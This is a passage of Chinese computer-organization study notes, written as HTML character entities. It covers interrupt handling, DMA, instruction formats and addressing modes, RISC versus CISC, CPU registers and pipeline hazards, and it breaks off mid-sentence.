&#x4E2D;&#x65AD;:&#x5728;&#x6267;&#x884C;&#x7A0B;&#x5E8F;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5F53;&#x51FA;&#x73B0;&#x5F02;&#x5E38;&#x60C5;&#x51B5;&#x6216;&#x7279;&#x6B8A;&#x60C5;&#x51B5;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x8BA1;&#x7B97;&#x673A;&#x505C;&#x6B62;&#x73B0;&#x884C;&#x7A0B;&#x5E8F;&#x7684;&#x8FD0;&#x884C;&#xFF0C;&#x8F6C;&#x5411;&#x5BF9;&#x8FD9;&#x4E9B;&#x5F02;&#x5E38;&#x60C5;&#x51B5;&#x6216;&#x7279;&#x6B8A;&#x60C5;&#x51B5;&#x7684;&#x8BF7;&#x6C42;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x5904;&#x7406;&#x7ED3;&#x675F;&#x540E;&#x518D;&#x8FD4;&#x56DE;&#x5230;&#x73B0;&#x884C;&#x7A0B;&#x5E8F;&#x7684;&#x95F4;&#x65AD;&#x5904;&#xFF0C;&#x7EE7;&#x7EED;&#x6267;&#x884C;&#x6E90;&#x7A0B;&#x5E8F;&#x3002; &#x7A0B;&#x5E8F;&#x4E2D;&#x65AD;&#x65B9;&#x5F0F;&#x914D;&#x7F6E;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x548C;&#x4E2D;&#x65AD;&#x5BC4;&#x5B58; &#x63A5;&#x53E3;&#x7535;&#x8DEF;&#x7684;&#x57FA;&#x672C;&#x7EC4;&#x6210; &#x4E2D;&#x65AD;&#x5904;&#x7406;&#x8FC7;&#x7A0B; CPU&#x54CD;&#x5E94;&#x4E2D;&#x65AD;&#x7684;&#x6761;&#x4EF6;&#x548C;&#x65F6;&#x95F4; (1)&#x6761;&#x4EF6; &#x5141;&#x8BB8;&#x4E2D;&#x65AD;&#x89E6;&#x53D1;&#x5668; EINT = 1 &#x7528; &#x5F00;&#x4E2D;&#x65AD; &#x6307;&#x4EE4;&#x5C06; EINT &#x7F6E; &#x201C;1&#x201D; &#x7528; &#x5173;&#x4E2D;&#x65AD; &#x6307;&#x4EE4;&#x5C06; EINT &#x7F6E;&#x201C; 0&#x201D; &#x6216;&#x786C;&#x4EF6; &#x81EA;&#x52A8;&#x590D;&#x4F4D; (2)&#x65F6;&#x95F4; &#x5F53; D = 1&#xFF08;&#x968F;&#x673A;&#xFF09;&#x4E14; MASK = 0 &#x65F6; &#x5728;&#x6BCF;&#x6761;&#x6307;&#x4EE4;&#x6267;&#x884C;&#x9636;&#x6BB5;&#x7684;&#x7ED3;&#x675F;&#x524D; CPU &#x53D1; &#x4E2D;&#x65AD;&#x67E5;&#x8BE2;&#x4FE1;&#x53F7;&#xFF08;&#x5C06; INTR &#x7F6E;&#x201C;1&#x201D;&#xFF09; I/O&#x4E2D;&#x65AD;&#x5904;&#x7406;&#x8FC7;&#x7A0B; 1.CPU&#x53D1;&#x542F;&#x52A8;I/O&#x8BBE;&#x5907;&#x547D;&#x4EE4;&#xFF0C;&#x5C06;&#x63A5;&#x53E3;&#x4E2D;&#x7684;B&#x7F6E;1&#xFF0C;D&#x7F6E;0 2.&#x63A5;&#x53E3;&#x542F;&#x52A8;&#x8F93;&#x5165;&#x8BBE;&#x5907;&#x5F00;&#x59CB;&#x5DE5;&#x4F5C; 3.&#x8F93;&#x5165;&#x8BBE;&#x5907;&#x5C06;&#x6570;&#x636E;&#x9001;&#x5165;&#x6570;&#x636E;&#x7F13;&#x51B2;&#x5BC4;&#x5B58;&#x5668; 4.&#x8F93;&#x5165;&#x8BBE;&#x5907;&#x5411;&#x63A5;&#x53E3;&#x53D1;&#x51FA;&#x201D;&#x8BBE;&#x5907;&#x5DE5;&#x4F5C;&#x7ED3;&#x675F;&#x201D;&#x4FE1;&#x53F7;&#xFF0C;&#x5C06;D&#x7F6E;1&#xFF0C;B&#x7F6E;0 5.&#x5F53;&#x8BBE;&#x5907;&#x51C6;&#x5907;&#x5C31;&#x7EEA;(D=1)&#xFF0C;&#x4E14;&#x672C;&#x8BBE;&#x5907;&#x672A;&#x88AB;&#x5C4F;&#x853D;(MASK=0)&#xFF0C;&#x5728;&#x6307;&#x4EE4;&#x6267;&#x884C;&#x9636;&#x6BB5;&#x7684;&#x7ED3;&#x675F;&#x65F6;&#x523B;&#xFF0C;&#x7531;CPU&#x53D1;&#x51FA;&#x4E2D;&#x65AD;&#x67E5;&#x8BE2;&#x4FE1;&#x53F7; 6.&#x8BBE;&#x5907;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x89E6;&#x53D1;&#x5668;INTR&#x88AB;&#x7F6E;1&#xFF0C;&#x6807;&#x5FD7;&#x8BBE;&#x5907;&#x5411;CPU&#x63D0;&#x51FA;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x3002;&#x4E8E;&#x6B64;&#x540C;&#x65F6;&#xFF0C;INTR&#x88AB;&#x9001;&#x81F3;&#x6392;&#x961F;&#x5668;&#xFF0C;&#x8FDB;&#x884C;&#x4E2D;&#x65AD;&#x4F18;&#x5224; 7.&#x82E5;CPU&#x5141;&#x8BB8;&#x4E2D;&#x65AD;(EINT=1),&#x8BBE;&#x5907;&#x53C8;&#x88AB;&#x9009;&#x4E2D;&#x6392;&#x961F;&#xFF0C;&#x5373;&#x8FDB;&#x5165;&#x4E2D;&#x65AD;&#x54CD;&#x5E94;&#x9636;&#x6BB5; 8.&#x5411;&#x91CF;&#x5730;&#x5740;&#x9001;&#x81F3;PC&#xFF0C;&#x4F5C;&#x4E3A;&#x4E0B;&#x4E00;&#x6761;&#x6307;&#x4EE4;&#x7684;&#x5730;&#x5740; 9.&#x65E0;&#x6761;&#x4EF6;&#x8F6C;&#x81F3;&#x8BBE;&#x5907;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x5165;&#x53E3;&#x5730;&#x5740;&#xFF0C;&#x8FDB;&#x5165;&#x4E2D;&#x65AD;&#x670D;&#x52A1;&#x9636;&#x6BB5; 10.&#x6267;&#x884C;&#x7ED3;&#x675F;&#xFF0C;&#x4E2D;&#x65AD;&#x8FD4;&#x56DE;&#x81F3;&#x539F;&#x7A0B;&#x5E8F;&#x7684;&#x65AD;&#x70B9;&#x5904; &#x4E2D;&#x65AD;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x6D41;&#x7A0B; &#x4FDD;&#x62A4;&#x73B0;&#x573A; &#x4E2D;&#x65AD;&#x670D;&#x52A1; &#x6062;&#x590D;&#x73B0;&#x573A; &#x4E2D;&#x65AD;&#x8FD4;&#x56DE; DMA&#x63A5;&#x53E3;&#x7684;&#x529F;&#x80FD;&#x548C;&#x7EC4;&#x6210; DMA&#x63A5;&#x53E3;&#x5177;&#x6709;&#x7684;&#x529F;&#x80FD; &#x5411;CPU&#x7533;&#x8BF7;DMA&#x4F20;&#x9001; &#x5728;CPU&#x5141;&#x8BB8;DMA&#x5DE5;&#x4F5C;&#x65F6;&#xFF0C;&#x5904;&#x7406;&#x603B;&#x7EBF;&#x63A7;&#x5236;&#x6743;&#x7684;&#x8F6C;&#x4EA4; &#x5728;DMA&#x671F;&#x95F4;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x603B;&#x7EBF;&#xFF0C;&#x63A7;&#x5236;&#x6570;&#x636E;&#x4F20;&#x9001; &#x786E;&#x5B9A;&#x6570;&#x636E;&#x4F20;&#x9001;&#x7684;&#x6C14;&#x52BF;&#x5730;&#x5740;&#x548C;&#x6570;&#x636E;&#x957F;&#x5EA6;&#xFF0C;&#x4FEE;&#x6B63;&#x6570;&#x636E;&#x4F20;&#x9001;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5730;&#x5740;&#x548C;&#x6570;&#x636E;&#x957F;&#x5EA6; &#x5728;&#x6570;&#x636E;&#x5757;&#x4F20;&#x9001;&#x7ED3;&#x675F;&#x65F6;&#xFF0C;&#x7ED9;&#x51FA;DMA&#x64CD;&#x4F5C;&#x5B8C;&#x6210;&#x7684;&#x4FE1;&#x53F7; DMA&#x4E0E;&#x4E3B;&#x5B58;&#x4EA4;&#x6362;&#x6570;&#x636E;&#x7684;&#x4E09;&#x79CD;&#x65B9;&#x5F0F; 1.&#x505C;&#x6B62;CPU&#x8BBF;&#x95EE;&#x4E3B;&#x5B58; 2.&#x5468;&#x671F;&#x632A;&#x7528; 3.DMA&#x4E0E;CPU&#x4EA4;&#x66FF;&#x8BBF;&#x95EE; DMA&#x57FA;&#x672C;&#x7EC4;&#x6210; DMA&#x7684;&#x5DE5;&#x4F5C;&#x8FC7;&#x7A0B; &#x9884;&#x5904;&#x7406;&#x3001;&#x6570;&#x636E;&#x4F20;&#x9001;&#x3001;&#x540E;&#x5904;&#x7406; DMA&#x65B9;&#x5F0F;&#x4E0E;&#x4E2D;&#x65AD;&#x7A0B;&#x5E8F;&#x7684;&#x6BD4;&#x8F83; &#x4E2D;&#x65AD;&#x65B9;&#x5F0F; DMA&#x65B9;&#x5F0F; &#x6570;&#x636E;&#x4F20;&#x9001; &#x7A0B;&#x5E8F; &#x786C;&#x4EF6; &#x54CD;&#x5E94;&#x65F6;&#x95F4; &#x6307;&#x4EE4;&#x6267;&#x884C;&#x7ED3;&#x675F; &#x5B58;&#x53D6;&#x5468;&#x671F;&#x7ED3;&#x675F; &#x5904;&#x7406;&#x5F02;&#x5E38;&#x60C5;&#x51B5; &#x80FD; &#x4E0D;&#x80FD; &#x4E2D;&#x65AD;&#x8BF7;&#x6C42; &#x4F20;&#x9001;&#x6570;&#x636E; &#x540E;&#x5904;&#x7406; &#x4F18;&#x5148;&#x7EA7; &#x4F4E; &#x9AD8; &#x4E03; &#x6307;&#x4EE4;&#x7CFB;&#x7EDF; &#x6307;&#x4EE4;&#x7684;&#x4E00;&#x822C;&#x683C;&#x5F0F; | &#x64CD;&#x4F5C;&#x7801;&#x5B57;&#x6BB5; | &#x5730;&#x5740;&#x7801;&#x5B57;&#x6BB5; | &#x64CD;&#x4F5C;&#x7801; &#x53CD;&#x6620;&#x673A;&#x5668;&#x505A;&#x4EC0;&#x4E48;&#x64CD;&#x4F5C; 1).&#x957F;&#x5EA6;&#x56FA;&#x5B9A;&#xFF1A;&#x7528;&#x4E8E;&#x6307;&#x4EE4;&#x5B57;&#x957F;&#x8F83;&#x957F;&#x7684;&#x60C5;&#x51B5;&#xFF0C;RISC&#x3002;&#x5982;IBM 370 &#x64CD;&#x4F5C;&#x7801; 8&#x4F4D; 2).&#x957F;&#x5EA6;&#x53EF;&#x53D8;&#xFF1A;&#x64CD;&#x4F5C;&#x7801;&#x5206;&#x6563;&#x5728;&#x6307;&#x4EE4;&#x5B57;&#x6BB5;&#x7684;&#x4E0D;&#x540C;&#x5B57;&#x6BB5;&#x4E2D;&#x3002; &#x6307;&#x4EE4;&#x5B57;&#x957F; &#x6307;&#x4EE4;&#x5B57;&#x957F;&#x51B3;&#x5B9A;&#x4E8E;&#x64CD;&#x4F5C;&#x7801;&#x7684;&#x957F;&#x5EA6;&#xFF0C;&#x64CD;&#x4F5C;&#x6570;&#x5730;&#x5740;&#x7684;&#x957F;&#x5EA6;&#xFF0C;&#x64CD;&#x4F5C;&#x6570;&#x5730;&#x5740;&#x7684;&#x4E2A;&#x6570; &#x6307;&#x4EE4;&#x5B57;&#x957F;&#x56FA;&#x5B9A;&#x7684;&#x8BDD;=&#x5B58;&#x50A8;&#x5B57;&#x957F; &#x6307;&#x4EE4;&#x5B57;&#x957F;&#x53EF;&#x53D8;&#x7684;&#x8BDD;=&#xFF0C;&#x6309;&#x5B57;&#x8282;&#x7684;&#x500D;&#x6570;&#x53D8;&#x5316; &#x64CD;&#x4F5C;&#x6570;&#x7C7B;&#x578B;&#x548C;&#x64CD;&#x4F5C;&#x79CD;&#x7C7B; &#x7C7B;&#x578B; &#x4EE3;&#x8868; &#x5730;&#x5740; &#x65E0;&#x7B26;&#x53F7;&#x6574;&#x6570; &#x6570;&#x5B57; &#x5B9A;&#x70B9;&#x6570;&#x3001;&#x6D6E;&#x70B9;&#x6570;&#x3001;&#x5341;&#x8FDB;&#x5236;&#x6570; &#x5B57;&#x7B26; ASCII &#x903B;&#x8F91;&#x6570; &#x903B;&#x8F91;&#x8FD0;&#x7B97; &#x64CD;&#x4F5C;&#x7C7B;&#x578B; &#x64CD;&#x4F5C;&#x7C7B;&#x578B; &#x89E3;&#x91CA; &#x6570;&#x636E;&#x4F20;&#x9001; &#x5BC4;&#x5B58;&#x5668;-&gt;&#x5BC4;&#x5B58;&#x5668;&#x3001;&#x5BC4;&#x5B58;&#x5668;-&gt;&#x5B58;&#x50A8;&#x5668;&#x7B49; &#x7B97;&#x6570;&#x903B;&#x8F91;&#x8FD0;&#x7B97; &#x52A0;&#x3001;&#x51CF;&#x3001;&#x4E58;&#x3001;&#x9664;&#x7B49; &#x79FB;&#x4F4D;&#x64CD;&#x4F5C; &#x7B97;&#x6570;&#x79FB;&#x4F4D;&#x3001;&#x903B;&#x8F91;&#x79FB;&#x4F4D;&#x3001;&#x5FAA;&#x73AF;&#x79FB;&#x4F4D;(&#x5E26;&#x8FDB;&#x4F4D;&#xFF0C;&#x4E0D;&#x5E26;&#x8FDB;&#x4F4D;) &#x8F6C;&#x79FB; &#x65E0;&#x6761;&#x4EF6;&#x8F6C;&#x79FB;(JMP)&#x3001;&#x6761;&#x4EF6;&#x8F6C;&#x79FB;{&#x7ED3;&#x679C;&#x4E3A;&#x96F6;&#x8F6C;(JZ)&#x3001;&#x7ED3;&#x679C;&#x6EA2;&#x51FA;&#x8F6C;(JO)&#x3001;&#x7ED3;&#x679C;&#x6709;&#x8FDB;&#x4F4D;&#x8F6C;(JC)&#x3001;&#x8DF3;&#x8FC7;&#x4E00;&#x6761;&#x6307;&#x4EE4;(SKP)} &#x8C03;&#x7528;&#x548C;&#x8FD4;&#x56DE; &#x9677;&#x9631;(Trap)&#x4E0E;&#x9677;&#x9631;&#x6307;&#x4EE4; &#x610F;&#x5916;&#x4E8B;&#x6545;&#x7684;&#x4E2D;&#x65AD; &#x8F93;&#x5165;&#x548C;&#x8F93;&#x51FA; &#x7AEF;&#x53E3;&#x5730;&#x5740;-&gt;CPU&#x7684;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;CPU&#x7684;&#x5BC4;&#x5B58;&#x5668;-&gt;&#x7AEF;&#x53E3;&#x5730;&#x5740; &#x5BFB;&#x5740;&#x65B9;&#x5F0F; &#x6307;&#x4EE4;&#x5BFB;&#x5740; &#x89E3;&#x91CA; &#x987A;&#x5E8F;&#x5BFB;&#x5740; &#x81EA;&#x52A8;&#x5F62;&#x6210;&#x4E0B;&#x4E00;&#x6761;&#x6307;&#x4EE4;&#x7684;&#x5730;&#x5740; &#x8DF3;&#x8DC3;&#x5BFB;&#x5740; &#x901A;&#x8FC7;&#x8F6C;&#x79FB;&#x7C7B;&#x6307;&#x4EE4;&#x5B9E;&#x73B0; &#x6570;&#x636E;&#x5BFB;&#x5740; &#x4F8B;&#x5B50; &#x7ACB;&#x5373;&#x5BFB;&#x5740; op # A &#x76F4;&#x63A5;&#x5BFB;&#x5740; EA=A &#x9690;&#x542B;&#x5BFB;&#x5740; ACC x &#x95F4;&#x63A5;&#x5BFB;&#x5740; EA=(A) &#x5BC4;&#x5B58;&#x5668;&#x5BFB;&#x5740; EA=R &#x5BC4;&#x5B58;&#x5668;&#x95F4;&#x63A5;&#x5BFB;&#x5740; EA=(R) &#x57FA;&#x5740;&#x5BFB;&#x5740; EA=A+(BR) &#x53D8;&#x5740;&#x5BFB;&#x5740; EA=A+(IX) &#x76F8;&#x5BF9;&#x5BFB;&#x5740; EA=(PC)+A &#x5806;&#x6808;&#x5BFB;&#x5740; PUSH A &#x8BBE;&#x8BA1;&#x6307;&#x4EE4;&#x683C;&#x5F0F;&#x5E94;&#x8003;&#x8651;&#x7684;&#x5404;&#x79CD;&#x56E0;&#x7D20; &#x56E0;&#x7D20; &#x8BE6;&#x7EC6; &#x64CD;&#x4F5C;&#x7C7B;&#x578B; &#x5305;&#x62EC;&#x6307;&#x4EE4;&#x6570;&#x53CA;&#x64CD;&#x4F5C;&#x7684;&#x96BE;&#x6613;&#x7A0B;&#x5EA6; &#x6570;&#x636E;&#x7C7B;&#x578B; &#x786E;&#x5B9A;&#x54EA;&#x4E9B;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x53C2;&#x4E0E;&#x64CD;&#x4F5C; &#x6307;&#x4EE4;&#x683C;&#x5F0F; &#x6307;&#x4EE4;&#x5B57;&#x957F;&#x662F;&#x5426;&#x56FA;&#x5B9A;&#x3001;&#x64CD;&#x4F5C;&#x7801;&#x6570;&#x3001;&#x662F;&#x5426;&#x91C7;&#x7528;&#x6269;&#x5C55;&#x64CD;&#x4F5C;&#x7801;&#x6280;&#x672F;&#xFF0C;&#x5730;&#x5740;&#x7801;&#x4F4D;&#x6570;&#x3001;&#x5730;&#x5740;&#x4E2A;&#x6570;&#x3001;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x7C7B;&#x578B; &#x5BFB;&#x5740;&#x65B9;&#x5F0F; &#x6307;&#x4EE4;&#x5BFB;&#x5740;&#x3001;&#x64CD;&#x4F5C;&#x6570;&#x5BFB;&#x5740; &#x5BC4;&#x5B58;&#x5668;&#x4E2A;&#x6570; &#x5BC4;&#x5B58;&#x5668;&#x7684;&#x591A;&#x5C11;&#x76F4;&#x63A5;&#x5F71;&#x54CD;&#x6307;&#x4EE4;&#x7684;&#x6267;&#x884C;&#x65F6;&#x95F4; RISC&#x6280;&#x672F; RISC:&#x7CBE;&#x7B80;&#x6307;&#x4EE4;&#x7CFB;&#x7EDF;&#x8BA1;&#x7B97;&#x673A; CISC:&#x590D;&#x6742;&#x6307;&#x4EE4;&#x7CFB;&#x7EDF;&#x8BA1;&#x7B97;&#x673A; RISC&#x7684;&#x4E3B;&#x8981;&#x7279;&#x5F81; &#x9009;&#x7528;&#x4F7F;&#x7528;&#x9891;&#x5EA6;&#x8F83;&#x9AD8;&#x7684;&#x4E00;&#x4E9B;&#x7B80;&#x5355;&#x6307;&#x4EE4;&#xFF0C;&#x590D;&#x6742;&#x6307;&#x4EE4;&#x7684;&#x529F;&#x80FD;&#x7531;&#x7B80;&#x5355;&#x6307;&#x4EE4;&#x6765;&#x7EC4;&#x5408; &#x6307;&#x4EE4; &#x957F;&#x5EA6;&#x56FA;&#x5B9A;&#x3001;&#x6307;&#x4EE4;&#x683C;&#x5F0F;&#x79CD;&#x7C7B;&#x5C11;&#x3001;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x5C11; &#x53EA;&#x6709; LOAD / STORE &#x6307;&#x4EE4;&#x8BBF;&#x5B58; CPU &#x4E2D;&#x6709;&#x591A;&#x4E2A; &#x901A;&#x7528; &#x5BC4;&#x5B58;&#x5668; &#x91C7;&#x7528; &#x6D41;&#x6C34;&#x6280;&#x672F; &#x4E00;&#x4E2A;&#x65F6;&#x949F;&#x5468;&#x671F; &#x5185;&#x5B8C;&#x6210;&#x4E00;&#x6761;&#x6307;&#x4EE4; &#x91C7;&#x7528; &#x7EC4;&#x5408;&#x903B;&#x8F91; &#x5B9E;&#x73B0;&#x63A7;&#x5236;&#x5668; &#x91C7;&#x7528; &#x4F18;&#x5316; &#x7684; &#x7F16;&#x8BD1; &#x7A0B;&#x5E8F; RISC&#x548C;CISC&#x7684;&#x6BD4;&#x8F83; RISC&#x66F4;&#x80FD; &#x5145;&#x5206;&#x5229;&#x7528; VLSI &#x82AF;&#x7247;&#x7684;&#x9762;&#x79EF; RISC &#x66F4;&#x80FD; &#x63D0;&#x9AD8;&#x8BA1;&#x7B97;&#x673A;&#x8FD0;&#x7B97;&#x901F;&#x5EA6;(&#x6307;&#x4EE4;&#x6570;&#x3001;&#x6307;&#x4EE4;&#x683C;&#x5F0F;&#x3001;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x5C11;,&#x901A;&#x7528; &#x5BC4;&#x5B58;&#x5668;&#x591A;&#xFF0C;&#x91C7;&#x7528;&#x7EC4;&#x5408;&#x903B;&#x8F91;&#xFF0C;&#x4FBF;&#x4E8E;&#x5B9E;&#x73B0;&#x6307;&#x4EE4;&#x6D41;&#x6C34;) RISC &#x4FBF;&#x4E8E;&#x8BBE;&#x8BA1;&#xFF0C;&#x53EF; &#x964D;&#x4F4E;&#x6210;&#x672C;&#xFF0C;&#x63D0;&#x9AD8; &#x53EF;&#x9760;&#x6027; RISC &#x6709;&#x5229;&#x4E8E;&#x7F16;&#x8BD1;&#x7A0B;&#x5E8F;&#x4EE3;&#x7801;&#x4F18;&#x5316; RISC &#x4E0D;&#x6613; &#x5B9E;&#x73B0; &#x6307;&#x4EE4;&#x7CFB;&#x7EDF;&#x517C;&#x5BB9; &#x516B; CPU&#x7684;&#x7ED3;&#x6784; CPU&#x7684;&#x529F;&#x80FD; &#x63A7;&#x5236;&#x5668;&#x7684;&#x529F;&#x80FD; &#x53D6;&#x6307;&#x4EE4;&#x3001;&#x5206;&#x6790;&#x6307;&#x4EE4;&#x3001;&#x6267;&#x884C;&#x6307;&#x4EE4;&#xFF0C;&#x53D1;&#x51FA;&#x5404;&#x79CD;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;&#x3001;&#x63A7;&#x5236;&#x7A0B;&#x5E8F;&#x8F93;&#x5165;&#x53CA;&#x7ED3;&#x679C;&#x7684;&#x8F93;&#x51FA;&#x3001;&#x603B;&#x7EBF;&#x7BA1;&#x7406;&#x3001;&#x5904;&#x7406;&#x5F02;&#x5E38;&#x60C5;&#x51B5;&#x548C;&#x7279;&#x6B8A;&#x60C5;&#x51B5;&#xFF1B;&#x5206;&#x522B;&#x5BF9;&#x5E94;&#x6307;&#x4EE4;&#x63A7;&#x5236;&#x3001;&#x64CD;&#x4F5C;&#x63A7;&#x5236;&#x3001;&#x65F6;&#x95F4;&#x63A7;&#x5236;&#x3001;&#x5904;&#x7406;&#x4E2D;&#x65AD;&#x3001;&#x6570;&#x636E;&#x52A0;&#x5DE5;&#x3002; &#x8FD0;&#x7B97;&#x5668;&#x7684;&#x529F;&#x80FD; &#x5B9E;&#x73B0;&#x7B97;&#x6570;&#x8FD0;&#x7B97;&#x548C;&#x903B;&#x8F91;&#x9884;&#x7B97; CPU&#x7684;&#x7ED3;&#x6784; CPU&#x7684;&#x5BC4;&#x5B58;&#x5668; &#x5206;&#x7C7B; &#x5BC4;&#x5B58;&#x5668; &#x4F5C;&#x7528; &#x7528;&#x6237;&#x53EF;&#x89C1;&#x5BC4;&#x5B58;&#x5668; &#x901A;&#x7528;&#x5BC4;&#x5B58;&#x5668; &#x5B58;&#x653E;&#x64CD;&#x4F5C;&#x6570;&#xFF1A;&#x53EF;&#x505A;&#x67D0;&#x79CD;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x6240;&#x9700;&#x7684;&#x4E13;&#x7528;&#x5BC4;&#x5B58;&#x5668; &#x7528;&#x6237;&#x53EF;&#x89C1;&#x5BC4;&#x5B58;&#x5668; &#x6570;&#x636E;&#x5BC4;&#x5B58;&#x5668; &#x5B58;&#x653E;&#x64CD;&#x4F5C;&#x6570;(&#x6EE1;&#x8DB3;&#x5404;&#x79CD;&#x6570;&#x636E;&#x7C7B;&#x578B;)&#x4E24;&#x4E2A;&#x5BC4;&#x5B58;&#x5668;&#x62FC;&#x63A5;&#x5B58;&#x653E;&#x53CC;&#x500D;&#x5B57;&#x957F;&#x6570;&#x636E; &#x7528;&#x6237;&#x53EF;&#x89C1;&#x5BC4;&#x5B58;&#x5668; &#x5730;&#x5740;&#x5BC4;&#x5B58;&#x5668; &#x5B58;&#x653E;&#x5730;&#x5740;&#xFF1A;&#x5176;&#x4F4D;&#x6570;&#x5E94;&#x6EE1;&#x8DB3;&#x6700;&#x5927;&#x7684;&#x5730;&#x5740;&#x8303;&#x56F4;&#x7528;&#x4E8E;&#x7279;&#x6B8A;&#x7684;&#x5BFB;&#x5740;&#x65B9;&#x5F0F; &#x6BB5;&#x57FA;&#x503C; &#x6808;&#x6307;&#x9488; &#x7528;&#x6237;&#x53EF;&#x89C1;&#x5BC4;&#x5B58;&#x5668; &#x6761;&#x4EF6;&#x7801;&#x5BC4;&#x5B58;&#x5668; &#x5B58;&#x653E;&#x6761;&#x4EF6;&#x7801;&#xFF1A;&#x53EF;&#x4F5C;&#x7A0B;&#x5E8F;&#x5206;&#x652F;&#x7684;&#x4F9D;&#x636E;&#x5982; &#x6B63;&#x3001;&#x8D1F;&#x3001;&#x96F6;&#x3001;&#x6EA2;&#x51FA;&#x3001;&#x8FDB;&#x4F4D;&#x7B49; &#x63A7;&#x5236;&#x548C;&#x72B6;&#x6001;&#x5BC4;&#x5B58;&#x5668; &#x63A7;&#x5236;&#x5BC4;&#x5B58;&#x5668; PC-&gt;MAR-&gt;M-&gt;MDR-&gt;IR&#xFF0C;&#x63A7;&#x5236;CPU &#x63A7;&#x5236;&#x548C;&#x72B6;&#x6001;&#x5BC4;&#x5B58;&#x5668; &#x72B6;&#x6001;&#x5BC4;&#x5B58;&#x5668; &#x72B6;&#x6001;&#x5BC4;&#x5B58;&#x5668;(&#x5B58;&#x653E;&#x6761;&#x4EF6;&#x7801;),PSW&#x5BC4;&#x5B58;&#x5668;(&#x5B58;&#x653E;&#x5B50;&#x7A0B;&#x5E8F;&#x72B6;&#x6001;&#x5B57;) &#x6307;&#x4EE4;&#x5468;&#x671F; &#x53D6;&#x51FA;&#x5E76;&#x6267;&#x884C;&#x4E00;&#x6761;&#x6307;&#x4EE4;&#x6240;&#x9700;&#x7684;&#x5168;&#x90E8;&#x65F6;&#x95F4;&#x3002;&#x5206;&#x4E3A;&#x53D6;&#x503C;&#x5468;&#x671F;&#x548C;&#x6267;&#x884C;&#x5468;&#x671F; &#x6307;&#x4EE4;&#x5468;&#x671F;&#x7684;&#x6570;&#x636E;&#x6D41; &#x53D6;&#x503C;&#x5468;&#x671F;&#x6570;&#x636E;&#x6D41; &#x95F4;&#x5740;&#x5468;&#x671F;&#x6570;&#x636E;&#x6D41; &#x6267;&#x884C;&#x5468;&#x671F;&#x6570;&#x636E;&#x6D41;&#x2013;&#x4E0D;&#x540C;&#x6307;&#x4EE4;&#x7684;&#x6267;&#x884C;&#x5468;&#x671F;&#x6570;&#x636E;&#x6D41;&#x4E0D;&#x540C; &#x4E2D;&#x65AD;&#x5468;&#x671F;&#x6570;&#x636E;&#x6D41; &#x5F71;&#x54CD;&#x6307;&#x4EE4;&#x6D41;&#x6C34;&#x7EBF;&#x6027;&#x80FD;&#x7684;&#x56E0;&#x7D20; &#x56E0;&#x7D20; &#x89E3;&#x91CA; &#x89E3;&#x51B3; &#x7ED3;&#x6784;&#x76F8;&#x5173; &#x4E0D;&#x540C;&#x6307;&#x4EE4;&#x4E89;&#x7528;&#x540C;&#x4E00;&#x529F;&#x80FD;&#x90E8;&#x4EF6;&#x4EA7;&#x751F;&#x8D44;&#x6E90;&#x51B2;&#x7A81;&#x4F7F;&#x6307;&#x4EE4;&#x6D41;&#x6C34;&#x51FA;&#x73B0;&#x505C;&#x987F;&#xFF0C;&#x5F71;&#x54CD;&#x6D41;&#x6C34;&#x7EBF;&#x6548;&#x7387; &#x505C;&#x987F;&#x3001;&#x6307;&#x4EE4;&#x5B58;&#x50A8;&#x5668;&#x548C;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x5668;&#x5206;&#x5F00;&#x3001;&#x6307;&#x4EE4;&#x9884;&#x53D6;&#x6280;&#x672F; &#x6570;&#x636E;&#x76F8;&#x5173; &#x4E0D;&#x540C;&#x6307;&#x4EE4;&#x56E0;&#x91CD;&#x53E0;&#x64CD;&#x4F5C;&#xFF0C;&#x53EF;&#x80FD;&#x6539;&#x53D8;&#x64CD;&#x4F5C;&#x6570;&#x7684; &#x8BFB;/&#x5199; &#x8BBF;&#x95EE;&#x987A;&#x5E8F; &#x540E;&#x63A8;&#x6CD5;&#x3001;&#x91C7;&#x7528;&#x65C1;&#x8DEF;&#x6280;&#x672F; &#x63A7;&#x5236;&#x76F8;&#x5173; &#x7531;&#x8F6C;&#x79FB;&#x6307;&#x4EE4;&#x5F15;&#x8D77; &#x4ECA;&#x65E9;&#x5224;&#x522B;&#x8F6C;&#x79FB;&#x662F;&#x5426;&#x53D1;&#x751F;&#x3001;&#x53CA;&#x65E9;&#x751F;&#x6210;&#x8F6C;&#x79FB;&#x76EE;&#x6807;&#x5730;&#x5740;&#x3001;&#x9884;&#x53D6;&#x8F6C;&#x79FB;&#x6210;&#x529F;&#x6216;&#x4E0D;&#x6210;&#x529F;&#x4E24;&#x4E2A;&#x63A7;&#x5236;&#x6D41;&#x65B9;&#x5411;&#x4E0A;&#x7684;&#x76EE;&#x6807;&#x6307;&#x4EE4;&#x3001;&#x52A0;&#x5FEB;&#x548C;&#x63D0;&#x524D;&#x5F62;&#x6210;&#x6761;&#x4EF6;&#x7801;&#x7B49; &#x6D41;&#x6C34;&#x7EBF;&#x6027;&#x80FD; &#x6307;&#x6807; &#x6027;&#x80FD; &#x541E;&#x5410;&#x7387; &#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185; &#x6D41;&#x6C34;&#x7EBF;&#x6240;&#x5B8C;&#x6210;&#x6307;&#x4EE4; &#x6216;&#x8F93;&#x51FA;&#x7ED3;&#x679C;&#x7684;&#x6570;&#x91CF; &#x52A0;&#x901F;&#x6BD4; m 